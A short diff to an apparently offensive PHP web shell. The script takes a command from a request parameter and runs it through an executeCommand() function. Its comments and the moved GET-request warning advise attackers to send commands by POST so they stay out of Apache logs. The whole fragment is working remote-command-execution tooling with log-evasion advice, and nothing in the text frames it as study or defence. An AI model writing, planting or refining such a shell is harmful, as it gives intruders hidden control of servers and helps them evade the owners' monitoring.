@@ -33,19 +33,17 @@ $port = 'port';
 // if not  this will avoid an  error on logs or  on all
 // pages if badly configured.
 
+// warn about noisy get requests
+if ($_SERVER['REQUEST_METHOD'] == 'GET') {
+   echo 'GET requests are most likely logged, better use POST instead';
+}
+
 if (isset($_REQUEST[$cmd])) {
    // grab the  command we want  to run from  the 'cmd'
-   // get  or post  parameter (post  don't display  the
-   // command on apache logs)
-   $command = $_REQUEST[$cmd];
-
-   // warn about noisy get requests
-   if ($_SERVER['REQUEST_METHOD'] == 'GET') {
-      echo 'GET requests are most likely logged, better use POST instead';
-   }
-
-   // notify on execution failure
-   if (!executeCommand($command)) {
+   // get or  post parameter (post doesn't  display the
+   // command on  apache logs) and notify  on execution
+   // failure
+   if (!executeCommand($_REQUEST[$cmd])) {
       echo 'The command failed to run';
    }
 
